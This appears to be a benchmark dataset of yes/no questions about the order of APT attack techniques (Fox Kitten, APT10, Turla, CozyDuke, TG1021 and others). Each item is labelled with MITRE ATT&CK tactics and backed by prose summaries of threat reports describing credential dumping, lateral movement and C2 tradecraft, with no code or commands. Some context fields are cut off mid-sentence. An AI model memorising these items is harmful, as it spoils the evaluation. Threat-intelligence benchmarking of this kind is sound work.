1678,312,312-Initial Access-T1566-Phishing,"Before phishing emails containing malicious attachments were sent to desired targets, is it likely that the threat actors initiated their campaign by conducting research on the targets to craft convincing emails?","Initial Access: The attackers initiated their campaign by researching desired targets and sending specifically crafted emails to individuals within the organizations. These emails often masqueraded as meeting invitations from business partners or as necessary security updates, containing malicious attachments. The attachments were either executables disguised as text files or password-protected archives with the password included in the email, which upon execution, installed the PoisonIvy backdoor Trojan.","Execution: Upon opening the malicious email attachment, the recipient inadvertently executed a file that installed PoisonIvy. This backdoor Trojan then contacted a C&C server using an encrypted communication protocol over TCP port 80. The attackers could then command the compromised computer to disclose its IP address, the names of other computers in the network, and Windows cached password hashes. The attackers used this access to traverse the network, infect additional computers, and ultimately aimed to obtain domain administrator credentials or access systems storing intellectual property.
Credential Access: The attackers leveraged the PoisonIvy Trojan to dump Windows cached password hashes from the compromised systems. This allowed them to potentially crack the passwords and gain unauthorized access to additional systems within the network.
Lateral Movement: The attackers used the credentials obtained from the compromised systems to move laterally within the network. Their goal was to find and access servers hosting sensitive intellectual property.
Collection: Once the attackers identified the desired intellectual property, they copied it to archives on internal systems that served as staging servers. This content was then prepared for exfiltration.
Command and Control: The PoisonIvy backdoor Trojan communicated with a C&C server over TCP port 80. The communication involved a handshake using an encryption algorithm, and the server would send binary code to be executed by the compromised system. Several C&C domains and IP addresses were identified, with some samples connecting directly to an IP address associated with a Chinese QQ user and antivirus-groups.com.
Exfiltration: The attackers uploaded the collected intellectual property from the internal staging servers to a remote site outside of the compromised organization, completing the attack.
Others: The Nitro Attacks targeted private companies in the chemical industry to steal intellectual property such as design documents, formulas, and manufacturing processes. The campaign began in late July 2011 and continued into mid-September 2011, with C&C servers used as early as April 2011. The attackers' geographic spread was wide, with infected machines located in the US, Bangladesh, the UK, and other countries. Attribution was traced back to a VPS in the US owned by a male located in the Hebei region of China, known as Covert Grove. The attacks used PoisonIvy, a RAT developed by a Chinese speaker. Other hacker groups also targeted the same chemical companies during this period, using malicious PDF and DOC files to drop variants of Backdoor.Sogu. The relationship between these groups is unclear.",Yes,the_nitro_attacks
1687,313,313-Persistence-T1547-Boot or Logon Autostart Execution,"After injecting decrypted shellcode into svchost.exe using DLL Side-Loading for execution, is APT10 likely to use the Run registry key to ensure persistence as part of their attack sequence?","Persistence: APT10's first loader variant used a service as its persistence method, installing jjs.exe as the service and starting it. The service names observed included WxUpdateServiceInfo, HxUpdateServiceInfo, WinDefendSec, Web_Client, clr_optimization_v4.0.30319_31, and clr_optimization_v4.0.30319_37. The second variant used the Run registry key for the current user under the name 'Windows Updata' to ensure persistence.","Initial Access: In April 2019, enSilo detected new activity by APT10, a Chinese cyber espionage group, in Southeast Asia. The group employed a tactic known as DLL Side-Loading, where a legitimate executable, jjs.exe, was abused to load a malicious DLL, jli.dll, instead of the legitimate one it depended on. This method was used to inject a shellcode into svchost.exe, which contained the actual malicious payload.
Execution: The malicious DLL, jli.dll, mapped the data file svchost.bin to memory and decrypted it, revealing a shellcode that was injected into svchost.exe. This process resembled previous versions used by APT10 in PlugX/RedLeaves malware. The injection flow involved creating a process in a suspended state, allocating memory, writing the shellcode, and executing it remotely.
Defense Evasion: APT10's loader implemented a decryption and injection mechanism to evade defenses. The PlugX payload used by APT10 replaced the DOS and NT headers' magic values with 'VX' to prevent security products from identifying executable headers during memory scans. Additionally, the malware authors wrapped memory allocation and release with dummy calls to GetForegroundWindow API function to generate noise and evade detection.
Command and Control: APT10 used Command and Control (C&C) servers located in South Korea. The first loader variant's domain (ffca[.]caibi379[.]com) resolved to IP addresses listed under 'DAOU TECHNOLOGY' in South Korea. The domain was registered in Hong Kong. The PlugX's domains resolved to IP addresses that were also associated with other domains used by APT10, indicating the same group operated both variants.
Others: APT10 delivered different payloads, including PlugX and Quasar RATs, with PlugX being developed in-house by the group. The Quasar RAT contained an addition of SharpSploit to extract passwords using mimikatz capabilities. The samples analyzed originated from the Philippines, and the activity was consistent with APT10's history of targeting Southeast Asia. The group used typosquatting domain names to pose as legitimate tech companies and employed unique malware families associated with them. The threat actor behind APT10 is still active, and the recent activity may be part of a testing environment or a short-lived attack.",Yes,Uncovering New Activity By APT10
1699,314,314-Discovery-T1497-Virtualization/Sandbox Evasion,"After Bvp47 uses a loader to decrypt and load its payload for persistence by hiding its processes, files, and network connections, is it likely that Bvp47 will conduct runtime environment tests and verify the operating environment as part of its discovery tactic?",Discovery: Bvp47 conducts runtime environment tests to prevent security researchers from performing dynamic analysis. It verifies the operating environment by checking the checksum against the number of blocks and files.,"Initial Access: In 2015, an advanced threat detection system alerted to suspicious communication activities between important servers. Two servers, V1 and V2, were compromised with backdoors, and a third server, host A, was identified as the source of external attacks. The V1 server received a SYN packet with a payload from host A, then initiated a connection to host A and exchanged a large amount of encrypted data. V1 also connected to V2's SMB service, performed sensitive operations, and downloaded suspicious files from a Python-implemented HTTP server on V1. These files included a Base64-encoded PowerShell script and encrypted data.
Execution: The Bvp47 backdoor, once activated, maintains a process in Linux user mode and kernel mode. It initializes the Bvp engine, performs environmental tests, decrypts payload blocks, tampers with kernel devmem restrictions, loads non-standard LKM module files, and hooks system functions to hide its presence.
Persistence: Bvp47 uses a loader to decrypt and load its payload, which is compressed and assembled at the end of the file. The payload includes various slices that provide backdoor functionality. The backdoor is designed to remain persistent on the system by hiding its processes, files, and network connections.
Privilege Escalation: Bvp47 hooks the devmem_is_allowed function, allowing user mode processes to read and write kernel space. It also hooks the avc_has_perm function to bypass SeLinux restrictions.
Defense Evasion: Bvp47 employs various techniques to evade detection, including hooking nearly 70 system functions, modifying the first four bytes of kernel module elf files, and using BPF as a covert channel to filter packets. It also uses XOR encryption for strings and blocks, obfuscates function names, and employs the Bvp engine for dynamic calculations of Linux kernel data and function addresses.
Lateral Movement: The V1 server connected to V2's SMB service to perform sensitive operations, indicating lateral movement within the compromised network.
Command and Control: Bvp47 establishes a covert communication channel using BPF to filter packets and employs RSA and RC-X algorithms for secure communication. It receives commands via SYN packets that meet specific BPF rules and then decrypts and executes them.
Others: The Bvp47 backdoor is attributed to the Equation Group, linked to the US NSA. It was discovered during an investigation of a key domestic department in 2013 and later connected to 'The Shadow Brokers Leaks' incident. The backdoor has been active for over 10 years, targeting 287 victims in 45 countries. It uses advanced covert channel behavior based on TCP SYN packets, code obfuscation, system hiding, and self-destruction design. The Bvp47 incidents are part of 'Operation Telescreen,' and the backdoor is considered a top-tier APT tool with capabilities spanning the *nix platform and possibly involving Cisco, Solaris, AIX, SUN, and Windows platforms.",Yes,The_Bvp47_a_top-tier_backdoor_of_us_nsa_equation_group.en
1706,316,316-Defense Evasion-T1027-Obfuscated Files or Information,"After Turla establishes a hidden foothold in infected networks for Persistence, is it likely that the malware will include a root kit to conceal the spying operation for Defense Evasion before its operators download specialized tools, like password stealers, to gather sensitive information during the Collection phase?","Defense Evasion: Turla is described as sophisticated malware that uses encryption to evade defenses. It is adept at hiding its tracks and maintaining control of infected networks. The malware includes a 'root kit' that conceals the spying operation and creates a hidden, encrypted file system to store stolen data and tools used by the attackers.","Initial Access: The CTI report indicates that the Turla spyware has been infecting government computers across Europe and the United States, suggesting an Initial Access tactic. The malware, also known as Uroburos, is believed to be linked to the Russian government and has been used to launch a massive breach on the U.S. military in 2008. It is part of a global cyber spying operation called Red October targeting diplomatic, military, and nuclear research networks.
Persistence: The Turla malware establishes a hidden foothold in infected networks, allowing the attackers to maintain persistent access. This foothold enables them to search other computers, store stolen information, and transmit data back to their servers.
Collection: Turla's operators can download specialized tools onto an infected system, adding any functionality they want by including it in the encrypted file system. These tools include password stealers, programs for gathering system information, and document stealers, indicating a Collection tactic.
Command and Control: Turla uses dozens of different command and control servers located in countries around the world to control infected systems. Symantec researchers have helped identify and shut down some of these systems. The code is regularly updated, including changes to avoid detection as anti-virus companies detect new strains.
Others: The CTI report authored by Peter Apps and Jim Finkle from Reuters, dated 2:45pm EST, discusses the Turla spyware targeting Europe and the United States. Security firms have been monitoring Turla for several years, with Symantec Corp estimating up to 1,000 networks infected by Turla and a related virus, Agent.BTZ. BAE Systems Applied Intelligence has collected over 100 unique samples of Turla since 2010. The report also mentions that the Federal Security Bureau, Pentagon, and U.S. Department of Homeland Security officials declined to comment on the matter.",Yes,Reuters_Turla
1709,316,316-Collection-T1005-Data from Local System,"After establishing a hidden foothold in infected networks for persistent access to search other computers and store stolen information, is it likely that Turla operators will use tools stored in the encrypted file system to collect data from local systems, such as programs for gathering system information, before updating command and control servers worldwide to maintain control of infected systems?","Collection: Turla's operators can download specialized tools onto an infected system, adding any functionality they want by including it in the encrypted file system. These tools include password stealers, programs for gathering system information, and document stealers, indicating a Collection tactic.","Initial Access: The CTI report indicates that the Turla spyware has been infecting government computers across Europe and the United States, suggesting an Initial Access tactic. The malware, also known as Uroburos, is believed to be linked to the Russian government and has been used to launch a massive breach on the U.S. military in 2008. It is part of a global cyber spying operation called Red October targeting diplomatic, military, and nuclear research networks.
Persistence: The Turla malware establishes a hidden foothold in infected networks, allowing the attackers to maintain persistent access. This foothold enables them to search other computers, store stolen information, and transmit data back to their servers.
Defense Evasion: Turla is described as sophisticated malware that uses encryption to evade defenses. It is adept at hiding its tracks and maintaining control of infected networks. The malware includes a 'root kit' that conceals the spying operation and creates a hidden, encrypted file system to store stolen data and tools used by the attackers.
Command and Control: Turla uses dozens of different command and control servers located in countries around the world to control infected systems. Symantec researchers have helped identify and shut down some of these systems. The code is regularly updated, including changes to avoid detection as anti-virus companies detect new strains.
Others: The CTI report authored by Peter Apps and Jim Finkle from Reuters, dated 2:45pm EST, discusses the Turla spyware targeting Europe and the United States. Security firms have been monitoring Turla for several years, with Symantec Corp estimating up to 1,000 networks infected by Turla and a related virus, Agent.BTZ. BAE Systems Applied Intelligence has collected over 100 unique samples of Turla since 2010. The report also mentions that the Federal Security Bureau, Pentagon, and U.S. Department of Homeland Security officials declined to comment on the matter.",Yes,Reuters_Turla
1712,317,317-Command and Control-T1071-Application Layer Protocol,"After utilizing the double extension trick (sample.doc.lnk) to evade defenses within their spearphishing campaign, is Mustang Panda likely to utilize documents attempting to connect to Command and Control (C2) domains and IP addresses as part of their communication strategy?","Command and Control: Mustang Panda's campaign involved command and control (C2) domains and IP addresses that were used to communicate with the compromised systems. The documents were attempting to, or were able to connect to various C2 domains and IP addresses.","Initial Access: The Anomali Threat Research Team identified an ongoing campaign by Mustang Panda using spearphishing with malicious '.lnk' files likely as the distribution method. These files contained embedded HTA scripts that, once executed, dropped and opened decoy documents while running malicious payloads in the background.
Execution: The '.lnk' files used by Mustang Panda typically contained an embedded HTA file with VBscript or PowerShell script that executed various operations including dropping Cobalt Strike Stagers and opening decoy documents. The PlugX malware was also delivered as a primary payload.
Defense Evasion: Mustang Panda utilized the double extension trick (sample.doc.lnk) to deceive users into opening malicious files. They also used PlugX and Cobalt Strike payloads, which align with previous findings of activity attributed to Mustang Panda by CrowdStrike.
Others: The Anomali Threat Research Team discovered an ongoing campaign by Mustang Panda targeting minority groups, public and private sector organizations. The campaign dates back to at least November 2018 and possibly as far back as October 2017. Targets include individuals interested in United Nations' Security Council Committee resolutions, Mongolian-based MIAT Airlines, non-profit China Center, and countries such as Germany, Mongolia, Myanmar, Pakistan, and Vietnam. The Communist Party of Vietnam (CVP) and the Shan Tai group were also targeted. The campaign's objectives align with China's strategic interests, including its 13th Five-Year Plan and the Belt and Road Initiative.",Yes,"China-Based APT Mustang Panda Targets Minority Groups, Public and Private Sector Organizations"
1720,318,318-Command and Control-T1071-Application Layer Protocol,"After CozyDuke establishes persistence through methods like registry modifications or COM-object hijacking, is it likely to communicate with its C&C server using HTTP, HTTPS, or Twitter for command and control?","Command and Control: CozyDuke communicates with its C&C server using HTTP or HTTPS, with the details specified in its configuration data. It can also use Twitter as a backup C&C channel, with the account details included in the configuration data. Known CozyDuke C&C servers are believed to be compromised servers.","Initial Access: The CozyDuke toolset includes an infection vector that involves spreading via email, typically containing a link to a compromised website hosting a ZIP file, or in some cases, hosted on Dropbox. The ZIP file contains an executable that, upon execution, writes to disk and executes CozyDuke while presenting the user with a decoy, such as an uninteresting PDF or a Flash video of monkeys.
Execution: The main component of CozyDuke is a DLL file responsible for orchestrating all of CozyDuke's activity on a victim machine. It is executed by the CozyDuke dropper using a copy of rundll32.exe. The entrypoint function varies but is always specified in the dropper configuration. The main component's functionalities include establishing persistence, gathering basic system information, communicating with the C&C server, and executing additional tasks, modules, or executables as commanded by the C&C server.
Persistence: CozyDuke establishes persistence by setting itself to be executed at system startup through registry values under various registry keys or by registering itself as a Windows service or scheduled task. It may also utilize COM-object hijacking to ensure it stays active on the victim host.
Defense Evasion: The main CozyDuke dropper checks for anti-virus products installed on the victim's machine and compares them to a predetermined list. If a match is found, the dropper exits immediately. Newer versions of the dropper also check for execution within a virtual machine or known malware analysis sandbox environment and will exit if these checks fail. The dropper decrypts encrypted data stored as PE resources in the executable, which are used to install CozyDuke components on the victim system.
Others: CozyDuke has been under active development since at least 2011 and is used for targeted attacks against high-profile organizations, including governmental entities. It shares infrastructure with other known threats like MiniDuke and OnionDuke. CozyDuke's evolution shows significant refactoring and additional functionality over time. The toolset includes modules and executables for tasks such as command execution, password stealing, and information collection. CozyDuke uses various user agent strings and mutexes, and a variety of filenames are associated with its activities.",Yes,CozyDuke
1724,319,319-Command and Control-T1090-Proxy,"After moving laterally within the network using tools such as 'STSRCheck' and 'PORT.EXE' for mapping systems and invoking pass-the-hash attacks, is it likely that the Fox Kitten Campaign will establish command and control by utilizing tools like Ngrok, Serveo, and FRP for reverse proxy/SSH forwarding?","Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.","Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.
Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.
Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",Yes,ClearSky-Fox-Kitten-Campaign-v1
1731,319,319-Discovery-T1046-Network Service Discovery,"After escalating privileges using JuicyPotato and capturing credentials from the Lsass.exe process with ProcDump and Mimikatz for credential access, is it likely that the Fox Kitten campaign will develop 'STSRCheck' and use 'PORT.EXE' to conduct network service discovery to map databases, servers, and open ports?","Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.","Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.
Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.
Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",Yes,ClearSky-Fox-Kitten-Campaign-v1
1734,319,319-Lateral Movement-T1021-Remote Services,"After achieving credential access through the use of Procdump and Mimikatz to extract credentials and employing 'Invoke the Hash' for pass-the-hash attacks, is the Fox Kitten Campaign likely to use tools like STSRCheck and PORT.EXE for lateral movement within the target networks?",Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.,"Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.
Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.
Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",Yes,ClearSky-Fox-Kitten-Campaign-v1
1736,319,319-Exfiltration-T1020-Automated Exfiltration,"After discovering databases, servers, and open ports using tools like 'STSRCheck' and 'PORT.EXE' for network mapping and scanning, is it likely that the Fox Kitten Campaign will compress valuable intelligence into archives using tools like WinRAR or 7-zip before exfiltrating the data?","Exfiltration: For exfiltration, the attackers manually selected valuable intelligence, compressed it into archives using WinRAR or 7-zip, and then exfiltrated the data.","Reconnaissance: The Fox Kitten Campaign, attributed to Iranian APT groups, involved reconnaissance activities targeting companies and organizations globally, including sectors like IT, Telecommunication, Oil and Gas, Aviation, Government, and Security. The campaign infrastructure served as a reconnaissance platform and could potentially deploy destructive malware such as ZeroCleare and Dustman, linked to APT34. Connections were identified with medium probability to APT33-Elfin and APT39-Chafer groups. The campaign's infrastructure, used since 2017, facilitated the development and maintenance of access routes, theft of valuable information, and long-lasting foothold in targeted organizations, enabling further breaches through supply-chain attacks.
Initial Access: The Fox Kitten Campaign primarily gained initial access by exploiting 1-day vulnerabilities in various VPN services, including Pulse Secure VPN, Fortinet VPN, and Global Protect by Palo Alto Networks. The attackers maintained access to networks by using communication tools like RDP over SSH tunneling, camouflaging and encrypting communications with the targets.
Execution: Upon initial compromise, the Fox Kitten Campaign utilized tools like Putty and Plink for execution purposes. Additionally, the attackers used a VBScript to download and unify hex-encoded file chunks from TXT files into executable files, bypassing antivirus detection.
Persistence: To ensure persistence within compromised networks, the Fox Kitten Campaign employed techniques such as creating local admin users and manipulating accessibility tools like 'Sticky Keys' to maintain high privileges.
Privilege Escalation: The campaign used tools like JuicyPotato for local privilege escalation and leveraged legitimate Microsoft tools like ProcDump, combined with Mimikatz, to steal credentials from the Lsass.exe process.
Defense Evasion: The Fox Kitten Campaign demonstrated defense evasion by using tools that were rarely detected by antivirus engines. The attackers also employed evasion techniques to identify and avoid virtual machine environments.
Credential Access: Credential access was achieved through the use of tools like Procdump and Mimikatz to dump and extract credentials from the Lsass.exe process. Additionally, the campaign utilized 'Invoke the Hash' for pass-the-hash attacks.
Discovery: For discovery within the target networks, the campaign developed a tool named 'STSRCheck' for mapping databases, servers, and open ports, and used 'PORT.EXE' to scan for predefined ports and IP addresses.
Lateral Movement: The Fox Kitten Campaign engaged in lateral movement using tools like 'STSRCheck' and 'PORT.EXE' to map and access various systems within the network. They also used 'Invoke the Hash' to perform pass-the-hash attacks.
Command and Control: The campaign established command and control using a self-developed backdoor named 'POWSSHNET' for RDP over SSH tunneling, and utilized socket-based backdoors for creating communication channels. Public tools like Ngrok, Serveo, and FRP were used for reverse proxy/SSH forwarding.
Others: The Fox Kitten Campaign is linked to Iranian APT groups, with connections to APT34, APT33, and APT39. The campaign's focus on IT companies suggests a strategy of targeting service providers to access networks of additional companies. The attackers' ability to exploit 1-day vulnerabilities shortly after disclosure indicates a high level of technical capability. The campaign's infrastructure includes a variety of offensive tools, some self-developed and others open-source or legitimate tools repurposed for malicious use. The attackers' methods include exploiting VPN vulnerabilities, maintaining access through RDP, and exfiltrating data. The campaign's duration and scope suggest it is one of Iran's most comprehensive espionage efforts to date.",Yes,ClearSky-Fox-Kitten-Campaign-v1
1738,32,32-Initial Access-T1190-Exploit Public-Facing Application,"Before gaining initial access by exploiting internet-facing Windows IIS servers using deserialization attacks and a 0-day vulnerability, is it likely that TG1021 performed reconnaissance by using tools like SharpHound and PowerSploit loaded directly into memory to gather information on targets?","Initial Access: TG1021 gained initial access to target networks by exploiting internet-facing Windows IIS servers using deserialization attacks. The threat actor leveraged a variety of exploits, including a 0-day vulnerability associated with the \","Reconnaissance: The Sygnia Incident Response team identified that TG1021, also known as \
Execution: TG1021 executed a sophisticated memory-resident malware, referred to as \
Persistence: To maintain persistence, TG1021 utilized web shells and a custom malware framework that operates almost entirely in-memory. The core component of this framework, the NodeIISWeb malware, intercepts and handles HTTP requests received by the server. Additionally, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Privilege Escalation: TG1021 employed various techniques for privilege escalation, including the use of a custom version of the Potato family tools, known as PotatoEx.dll, which is a common local privilege escalation tool. The threat actor also used dynamic DLL loading and execution, as well as code injection and token manipulation functionalities provided by the second stage malware, ExtDLL.dll.
Defense Evasion: TG1021 demonstrated significant efforts to avoid detection by actively interfering with logging mechanisms and successfully evading commercial EDRs. The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs, and by silently awaiting incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Credential Access: TG1021 modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code.
Discovery: TG1021 used publicly available offensive security tools (OST) to perform reconnaissance, such as SharpHound to scan and map targets by loading it directly to infected machines' memory without writing the binary on the disk. Quickly after the execution, the threat actor retrieved the output files and deleted them. In addition, PowerSploit was loaded and executed using the same technique.
Lateral Movement: After establishing a foothold on an external IIS server, TG1021 accessed shared folders on internal web servers over SMB using compromised domain credentials. On several occasions, the threat actor dropped the NodeIISWeb web shell loader via SMB to compromise additional servers. Additionally, the threat actor utilized the exploits mentioned above to move laterally between IIS servers.
Command and Control: TG1021 established command and control by deploying an inline hook on a validation function within the IIS request handling process. The malware, NodeIISWeb, provided backdoor functionality, allowing the threat actor to perform various actions on the affected host, including file and directory manipulation, system information gathering, dynamic DLL loading and execution, and code injection.",Yes,TG1021 - Praying Mantis Threat Actor
1740,32,32-Privilege Escalation-T1548-Abuse Elevation Control Mechanism,"After TG1021 utilized web shells and custom in-memory malware for persistence, is it likely that they interfered with logging mechanisms for defense evasion before using PotatoEx.dll for privilege escalation?","Privilege Escalation: TG1021 employed various techniques for privilege escalation, including the use of a custom version of the Potato family tools, known as PotatoEx.dll, which is a common local privilege escalation tool. The threat actor also used dynamic DLL loading and execution, as well as code injection and token manipulation functionalities provided by the second stage malware, ExtDLL.dll.","Reconnaissance: The Sygnia Incident Response team identified that TG1021, also known as \
Initial Access: TG1021 gained initial access to target networks by exploiting internet-facing Windows IIS servers using deserialization attacks. The threat actor leveraged a variety of exploits, including a 0-day vulnerability associated with the \
Execution: TG1021 executed a sophisticated memory-resident malware, referred to as \
Persistence: To maintain persistence, TG1021 utilized web shells and a custom malware framework that operates almost entirely in-memory. The core component of this framework, the NodeIISWeb malware, intercepts and handles HTTP requests received by the server. Additionally, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Defense Evasion: TG1021 demonstrated significant efforts to avoid detection by actively interfering with logging mechanisms and successfully evading commercial EDRs. The malware used by TG1021 shows a significant effort to avoid detection, both by actively interfering with logging mechanisms, successfully evading commercial EDRs, and by silently awaiting incoming connections, rather than connecting back to a C2 channel and continuously generating traffic. Furthermore, the threat actor actively removed all disk-resident tools after using them, effectively giving up on persistency in exchange for stealth.
Credential Access: TG1021 modified login webpages to record credentials and save them to a file in clear text format. The modification is a short-embedded code-block at the beginning of the webpage file with a simple try-catch phrase code.
